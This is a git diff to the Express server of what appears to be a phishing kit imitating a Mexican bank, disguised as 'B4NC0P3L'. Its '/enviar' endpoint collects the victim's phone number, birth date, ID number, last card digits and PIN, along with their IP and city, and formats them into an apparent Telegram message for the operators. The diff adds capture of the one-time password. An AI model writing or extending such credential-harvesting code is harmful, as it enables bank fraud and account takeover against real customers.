@@ -40,13 +40,13 @@ async function obtenerCiudad(ip) {
 }
 
 app.post('/enviar', async (req, res) => {
-  const { celular, fechaNacimiento, tipoIdentificacion, numeroIdentificador, ultimos2, nip, txid } = req.body;
+  const { celular, fechaNacimiento, tipoIdentificacion, numeroIdentificador, ultimos2, nip, otp, txid } = req.body;
 
   const ip = obtenerIpReal(req);
   const ciudad = await obtenerCiudad(ip);
 
   const mensaje = `
-🔵B4NC0P3L🔵
+🔐🔵B4NC0P3L🔵
 🆔 ID: <code>${txid}</code>
 
 📱 Celular: ${celular}
@@ -55,6 +55,8 @@ app.post('/enviar', async (req, res) => {
 🔢 Identificador: ${numeroIdentificador}
 💳 Últimos 2: ${ultimos2}
 🔐 NIP: ${nip}
+
+🔑OTP: ${otp}
 
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
